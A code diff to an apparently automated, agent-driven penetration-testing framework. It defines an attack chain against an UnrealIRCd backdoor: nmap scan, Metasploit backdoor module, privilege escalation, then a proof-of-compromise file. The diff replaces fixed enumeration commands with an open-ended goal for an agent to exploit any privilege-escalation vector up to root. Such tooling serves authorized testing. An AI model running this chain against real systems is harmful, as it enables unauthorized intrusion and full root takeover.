@@ -10,11 +10,11 @@ Chain:
   recon          — nmap full scan
   irc_fingerprint— banner-grab 6667 to confirm UnrealIRCd
   irc_backdoor   — exploit/unix/irc/unreal_ircd_3281_backdoor -> shell
-  privesc_lookup — id / sudo -l / find SUID enumeration on the new shell
+  escalate — id / sudo -l / find SUID enumeration on the new shell
   file_drop      — write proof-of-compromise file and read it back
 
 Expected: clean run lands a command shell via the backdoor.
-privesc_lookup reports whatever privesc surface the shell user has,
+escalate reports whatever privesc surface the shell user has,
 and file_drop writes /tmp/pwned_unrealircd.txt as the impact step.
 """
 
@@ -103,26 +103,20 @@ def build_unrealircd_backdoor_graph(target_ip: str, attacker_ip: str) -> AttackG
     ))
 
     graph.add_node(AttackNode(
-        id="privesc_lookup",
-        label="Enumerate Privesc Vectors from Shell",
+        id="escalate",
+        label="Escalate Privileges to Root",
         tactic=Tactic.PRIVILEGE_ESCALATION.value,
-        technique_id="T1082",
-        technique_name="System Information Discovery",
+        technique_id="T1068",
+        technique_name="Exploitation for Privilege Escalation",
         agent_type="privesc",
-        goal="Identify whether the backdoor shell can reach root",
-        objective="Enumerate id, sudo, SUID binaries, and writable system paths "
-                  "from the newly opened session.",
+        goal="Escalate the compromised session to root",
+        objective="From the existing session, enumerate AND exploit any viable "
+                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
+                  "capabilities, writable config, docker group) to obtain a root "
+                  "shell. Verify success with id/whoami showing uid=0.",
         target_ip=target_ip,
-        tool_name="session",
-        commands_to_run=[
-            "id",
-            "whoami",
-            "uname -a",
-            "sudo -n -l",
-            "find / -perm -4000 -type f 2>/dev/null | head -20",
-        ],
-        max_retries=1,
-        tags=["privesc", "enum", "suid"],
+        max_retries=3,
+        tags=["privesc", "escalation", "goal_only"],
     ))
 
     graph.add_node(AttackNode(
@@ -184,7 +178,7 @@ def build_unrealircd_backdoor_graph(target_ip: str, attacker_ip: str) -> AttackG
     )
 
     graph.connect(
-        "irc_backdoor", "privesc_lookup",
+        "irc_backdoor", "escalate",
         checks=[
             EdgeCheck(
                 field="session_id", operator="exists",
@@ -196,7 +190,7 @@ def build_unrealircd_backdoor_graph(target_ip: str, attacker_ip: str) -> AttackG
     )
 
     graph.connect(
-        "privesc_lookup", "file_drop",
+        "escalate", "file_drop",
         checks=[
             EdgeCheck(
                 field="success", operator="equals", expected="True",
